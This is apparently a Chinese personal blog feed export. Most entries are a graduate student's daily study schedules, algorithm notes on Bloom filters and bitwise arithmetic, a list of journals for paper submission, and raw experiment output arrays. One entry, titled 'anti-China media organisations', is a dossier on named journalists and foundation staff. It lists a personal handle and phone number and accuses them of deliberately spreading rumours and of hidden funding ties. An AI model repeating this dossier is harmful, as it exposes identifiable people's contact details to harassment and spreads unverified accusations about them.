下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">算法</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">算法6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-6研究生的倒数第315天</title>
      <link href="/2022/07/06/2022-7-6%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC315%E5%A4%A9/"/>
      <url>/2022/07/06/2022-7-6%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC315%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00     <strong><font color="#D2691E">转移论文</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-5研究生的倒数第316天</title>
      <link href="/2022/07/05/2022-7-5%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC316%E5%A4%A9/"/>
      <url>/2022/07/05/2022-7-5%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC316%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h1><ol><li>量力而行，任务被问题卡住，js</li><li>论文转移效率低</li><li>早上问题也未解决</li><li>算法任务也未完成，先看完，再做其他的，不要卡</li></ol><h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 今日学习学习             <strong><font color="#D2691E">js</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 今日学习学习  <strong><font color="#D2691E">设计模式</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 今日学习学习  <strong><font color="#D2691E">论文</font></strong></li></ul><hr><ul><li>[] 午饭时间 <strong><font color="#D2691E">算法看完</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">论文转移</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">论文转移</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">论文转移</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 17:30~20：00 晚上学习安排            <strong><font color="#8B008B">录视频</font></strong>    </li><li><input disabled="" type="checkbox"> 晚上学习总结 <font color="#00CED1"><strong>算法</strong></font></li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-4研究生的倒数第317天</title>
      <link href="/2022/07/04/2022-7-4%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC317%E5%A4%A9/"/>
      <url>/2022/07/04/2022-7-4%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC317%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 今日学习学习             <strong><font color="#D2691E">js测试器</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 今日学习学习  <strong><font color="#D2691E">js，原型链，直接看视频</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 今日学习学习  <strong><font color="#D2691E">生成模式</font></strong></li></ul><hr><ul><li>[] 午饭时间 <strong><font color="#D2691E">找期刊模板</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">解决上午问题</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">论文转移</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">论文转移</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 17:30~20：00 晚上学习安排            <strong><font color="#8B008B">录视频</font></strong>    </li><li><input disabled="" type="checkbox"> 晚上学习总结 <font color="#00CED1"><strong>算法</strong></font></li></ul><h1 id="DONE-List"><a href="#DONE-List" class="headerlink" title="DONE List"></a>DONE List</h1><ol><li>算法这块，快排</li><li>js测试器同一个文件下正常，其它文件函数存在问题</li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-3研究生的倒数第318天</title>
      <link href="/2022/07/03/2022-7-3%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC318%E5%A4%A9/"/>
      <url>/2022/07/03/2022-7-3%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC318%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 10:00~11:00 JS  <strong><font color="#D2691E">todo-1</font></strong></li><li><input disabled="" type="checkbox"> 11:10~ 算法 <strong><font color="#8BB382">todo-2</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 13:40~15:00 JS            <strong><font color="#ff7500">todo-3</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:30 算法            <strong><font color="#01274F">todo-4</font></strong></li><li><input disabled="" type="checkbox"> 16:35~17:20 JS            <strong><font color="#2e4e7e">todo-5</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 20:00~21:30 小论文重写            <strong><font color="#8B008B">todo-6</font></strong></li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><ol><li>原型链这块比较难，又很重要还在啃。</li></ol>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode中知识点</title>
      <link href="/2022/07/03/leetcode%E4%B8%AD%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/07/03/leetcode%E4%B8%AD%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ol><li>master准则，计算时间复杂度</li></ol><p><img src="https://files.shanqianche.cn/20227/1656853689146.png" alt="时间复杂度-master公式"><br>2. 归并排序的实质：有序的部分data在全体data中进行排序<br>3. 计组计网卡住了</p><p><img src="https://files.shanqianche.cn/20227/1657721593588.png" alt="位运算"></p><ol start="4"><li>资源限制类题目</li></ol><p><img src="https://files.shanqianche.cn/20227/1658153778430.png" alt="资源限制类题目"></p><h1 id="基础提升"><a href="#基础提升" class="headerlink" title="基础提升"></a>基础提升</h1><ol><li>布隆过滤器</li></ol><p>两个重要参数：n(样本量)，p(失误率)</p><p>关键因素：是否为集合模型【没有删除，类似黑名单】，失误率</p><p>公式【<font color="#E9967A">根据样本量和失误率求内存</font>】： $$m=-\frac { n * \ln p } { ( \ln 2 ) ^ { 2 } }$$ m为bit，除以8为字节。</p><p>公式【<font color="#9932CC">求hash函数个数</font>，向上取整】：$$k=\ln 2 * \frac { m } { n } \approx 0.7 * \frac { m } { n }$$<br>公式【根据前两个求出<font color="#FF00FF">失误率的真实值，主要确认容量大小</font>】：$$R _ { 真 } = ( 1 - e ^ { - \frac { n * k _ { 真 } } { m _ { 真 } } } ) ^ { k _ { 真 } }$$</p><ol start="2"><li><p>hash一致性</p><ul><li>在环上并不能通过hash函数均匀分布</li><li>扩容后的内存分配不均</li></ul></li></ol><p>解决方案：<font color="#7FFF00">虚拟节点vnode</font></p><ol start="3"><li>计算是否为2的指数，四的指数</li></ol><p><img src="https://files.shanqianche.cn/20227/1658233023651.png" alt="指数计算"><br>4. 位运算</p><p>^无进位相加； &amp;&lt;&lt;1为两数的相加进位信息；所以两数相加，等于抑或和与左移一位的数相加。</p><p><img src="https://files.shanqianche.cn/20227/1658234042467.png" alt="位运算加法"></p><p><img src="https://files.shanqianche.cn/20227/1658234215827.png" alt="代码实现加法"></p><p><img src="https://files.shanqianche.cn/20227/1658234229421.png" alt="减法为加-b"></p><p><img src="https://files.shanqianche.cn/20227/1658234405860.png" alt="乘法"><br><img src="https://files.shanqianche.cn/20227/1658234543214.png" alt="乘法"></p><p><img src="https://files.shanqianche.cn/20227/1658236298670.png" alt="除法，右移避免溢出"></p><h1 id="pedding"><a href="#pedding" class="headerlink" title="pedding"></a>pedding</h1><p>普通最后一节课</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小论文投稿计划</title>
      <link href="/2022/06/30/%E5%B0%8F%E8%AE%BA%E6%96%87%E6%8A%95%E7%A8%BF%E8%AE%A1%E5%88%92/"/>
      <url>/2022/06/30/%E5%B0%8F%E8%AE%BA%E6%96%87%E6%8A%95%E7%A8%BF%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="会议"><a href="#会议" class="headerlink" title="会议"></a>会议</h1><ul><li>计算机体系结构、并行与分布式计算</li></ul><p><img src="http://files.shanqianche.cn/20226/1656583136044.png" alt="enter description here"></p><ul><li>2022年第四届人工智能与计算机科学国际学术会议</li></ul><p><img src="http://files.shanqianche.cn/20226/1656585215304.png" alt="enter description here"></p><ul><li>计算机体系结构、并行与分布式计算</li></ul><p><img src="http://files.shanqianche.cn/20226/1656583153933.png" alt="enter description here"></p><ul><li>ICTAI</li></ul><p><img src="http://files.shanqianche.cn/20226/1656583256229.png" alt="enter description here"></p><ul><li>2022年第五届机电、机器人与自动化国际会议 (ICMRA2022)</li></ul><p><img src="http://files.shanqianche.cn/20226/1656583640482.png" alt="enter description here"></p><h1 id="期刊"><a href="#期刊" class="headerlink" title="期刊"></a>期刊</h1><ul><li>计算机应用</li><li>计算机科学</li><li>计算机工程与应用：审稿费100元，审稿周期60-70天左右，版面费930-1100元不等。该刊是旬刊，从录用到出刊大概需要12个月，有时看运气，如果运气好点四个月左右。最大特点是该刊的承载的论文数量较大，相对来说比较好中，但大家都看中的这一特点，所以从论文的数量上来说，须有点创新点较好，比较看重博士论文。可以加急出刊，但费用较高。总结：容易。</li><li>计算机工程与设计：审稿费100元，（加急审稿200元，一个月审回），审稿周期60天左右，版面费900-1100元左右。该刊是半月刊。从录用到出刊大概10个月左右。论文的质量一般，比较好中。该刊比较注重项目的基金号或是重大科研课题，如果有比较牛基金号录用率一般在90%以上。可以加急出刊，费用较高，一般是版面费的一半左右。总结：容易。</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-6-20研究生的倒数第331天</title>
      <link href="/2022/06/20/2022-6-20%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC331%E5%A4%A9/"/>
      <url>/2022/06/20/2022-6-20%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC331%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习安排            <strong><font color="#D2691E">JavaScript</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:50 今日学习安排          <strong><font color="#D2691E">JavaScript</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 上午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">JavaScript</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">paper</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">paper</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">计网</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">JavaScript</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反华媒体组织</title>
      <link href="/2022/06/05/%E5%8F%8D%E5%8D%8E%E5%AA%92%E4%BD%93%E7%BB%84%E7%BB%87/"/>
      <url>/2022/06/05/%E5%8F%8D%E5%8D%8E%E5%AA%92%E4%BD%93%E7%BB%84%E7%BB%87/</url>
      
        <content type="html"><![CDATA[<h1 id="马格南基金"><a href="#马格南基金" class="headerlink" title="马格南基金"></a>马格南基金</h1><h2 id="组织关系"><a href="#组织关系" class="headerlink" title="组织关系"></a>组织关系</h2><ol><li>与<font color="#ff7500">索罗斯的基金会</font>【疑是金主】、福特基金会，美国民主基金会有关联</li><li>下属有马格南画报社，马格南记者协会<h2 id="重要人员"><a href="#重要人员" class="headerlink" title="重要人员"></a>重要人员</h2></li><li>肖慕漪-国内记者【国内媒体摄影师，路透社以及“中参馆”】 @muyixiao +12014695771</li><li>曹梦雯-现任**<font color="#FF1493">马格南基金会项目经理</font>**， 纽约文化沙龙”的成员</li><li>沈璐-“中参馆”</li><li>余心妍-BBC</li><li>周优游-“石英”网站</li><li><font color="#7FFF00">曹梦雯和肖慕漪有在马格南基金会的联系，而沈璐又和肖慕漪一样在“中参馆”供职。</font></li></ol><p><img src="http://files.shanqianche.cn/20226/1654429696469.png" alt="相关人员"></p><h2 id="活动"><a href="#活动" class="headerlink" title="活动"></a>活动</h2><ol><li>2020《纽约时报》肖慕漪故意造谣抹黑武汉疫情</li><li>2021年10月30日，在余心妍的主持下，他们开始宣传一部由福特基金会赞助的武汉疫情纪录片，推进他们的切尔诺贝利叙事。</li></ol><h1 id="亚裔美国记者协会（Asian-American-Journalists-Association，AAJA）"><a href="#亚裔美国记者协会（Asian-American-Journalists-Association，AAJA）" class="headerlink" title="亚裔美国记者协会（Asian American Journalists Association，AAJA）"></a>亚裔美国记者协会（Asian American Journalists Association，AAJA）</h1><h2 id="组织关系-1"><a href="#组织关系-1" class="headerlink" title="组织关系"></a>组织关系</h2><ol><li>美国亚裔和太平洋岛民（简称为“AAPI”）社区召集人、孵化器和资助人美国亚裔基金会（The Asian American Foundation，简称为“TAAF“ 于2021年5月成立。以下组织已获得TAAF的首次赠款，现已成为其网络的一部分：Act to Change、美国亚裔记者协会、Interfaith Youth Core、<font color="#FF1493">美国亚太裔律师协会（NAPABA）</font>、RISE Together Fund、美国锡克法律辩护和教育基金（SALDEF）和锡克联盟。</li></ol><h2 id="重要人物"><a href="#重要人物" class="headerlink" title="重要人物"></a>重要人物</h2><ol><li>Sonal Shah-TAAF总裁</li><li>妮可·邓卡（Nicole Dungca）-波士顿环球报“聚焦”专栏组的调查记者</li><li>迈克尔吉田 （Michael Yoshida）-WHDH电视台新闻记者</li><li>乔伊·廉·尼科瑞恩（Joy Lim Nakrin）-NBC波士顿电视台</li><li>扬·金（Young-Jin Kim）-NBC波士顿电视台的社交媒体总编辑</li><li>本·渡边（Ben Watanabe）-NESN电视台的数据编辑</li><li><a href="https://twitter.com/i/status/1373026515772968961">重要组成人物</a></li></ol><p><img src="http://files.shanqianche.cn/20226/1654431976778.png" alt="NBC波士顿社交媒体总编辑扬·金讲话 徐施钰摄    "></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> report </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-30研究生的倒数第362天</title>
      <link href="/2022/05/30/2022-5-30%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC362%E5%A4%A9/"/>
      <url>/2022/05/30/2022-5-30%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC362%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">小论文相关问题</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 上午学习总结</li><li><input disabled="" type="checkbox"> 10:20~10:50  今日学习学习            <strong><font color="#D2691E">小论文设计方案</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20  今日学习学习            <strong><font color="#D2691E">看好js放松</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">todo-2</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">todo-3</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">todo-4</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-24研究生的倒数第358天</title>
      <link href="/2022/05/24/2022-5-24%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC358%E5%A4%A9/"/>
      <url>/2022/05/24/2022-5-24%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC358%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:50~10:20 今日学习学习            <strong><font color="#D2691E">实验</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 今日学习学习</li><li><input disabled="" type="checkbox"> 10:50~11:20 今日学习学习</li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">实验</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">JavaScript高级程序设计</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            </li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">英语</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排        </li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p>[(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 0, -1, array([[ 1.73, 14.  ,  0.  ,  1.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 6, -1, array([[ 1.73, 13.  ,  6.  ,  0.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 13, -1, array([[ 1.73, 13.  ,  6.  ,  1.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 15, 1.01, array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 12.  ,  1.  ,  1.  ,  1.73, 11.  ]]), 20, -1, array([[ 1.73, 12.  ,  6.  ,  2.  ,  1.73, 11.  ]]), False, 0.6666666666666666)]</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-5-23研究生的倒数第359天</title>
      <link href="/2022/05/23/2022-5-23%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC359%E5%A4%A9/"/>
      <url>/2022/05/23/2022-5-23%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC359%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><hr><ul><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">完成算法相关改进</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">采样优先度计算完成</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">JavaScript高级程序设计</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">英语</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p><img src="http://files.shanqianche.cn/20225/1653316893624.png" alt="相关系数"></p><p>[(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 8, -1, array([[ 1.73, 11.  ,  1.  ,  2.  ,  1.73, 11.  ]]), False, 1.0),<br>(array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), 3, -1, array([[ 2.6 ,  9.5 ,  3.  ,  1.  ,  1.73, 11.  ]]), False, 0.75),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 1, 1.01, array([[ 1.73, 12.  ,  1.  ,  1.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 15, 1.01, array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 15, 1.01, array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 1, 1.01, array([[ 1.73, 12.  ,  1.  ,  1.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 15, 1.01, array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), 6, 1.01, array([[ 1.73, 10.  ,  6.  ,  0.  ,  1.73, 11.  ]]), True, 0.6666666666666666),<br>(array([[ 1.73, 10.  ,  1.  ,  3.  ,  1.73, 11.  ]]), 11, -1, array([[ 0.  ,  9.  ,  4.  ,  2.  ,  1.73, 11.  ]]), False, 0.6),<br>(array([[ 1.73, 10.  ,  6.  ,  0.  ,  1.73, 11.  ]]), 7, -1, array([[-6.93, 12.  ,  0.  ,  2.  ,  1.73, 11.  ]]), False, 0.5),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 11, -1, array([[ 0.  , 12.  ,  4.  ,  2.  ,  1.73, 11.  ]]), False, 0.375),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 7, -1, array([[ 1.73, 15.  ,  0.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 12.  ,  1.  ,  1.  ,  1.73, 11.  ]]), 19, -1, array([[ 4.33, 13.5 ,  5.  ,  3.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 18, -1, array([[-0.87, 11.5 ,  4.  ,  3.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 0, -1, array([[ 1.73, 14.  ,  0.  ,  1.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 5, -1, array([[ 2.6 , 13.5 ,  5.  ,  1.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 9, -1, array([[ 0.  , 14.  ,  2.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 12, -1, array([[ 3.46, 14.  ,  5.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 9, -1, array([[ 0.  , 14.  ,  2.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 7, -1, array([[ 1.73, 15.  ,  0.  ,  2.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 0, -1, array([[ 1.73, 14.  ,  0.  ,  1.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  ]]), 19, -1, array([[ 4.33, 14.5 ,  5.  ,  3.  ,  1.73, 11.  ]]), False, 0.0),<br>(array([[ 1.73, 13.  , -1.  , -1.  ,  1.73, 11.  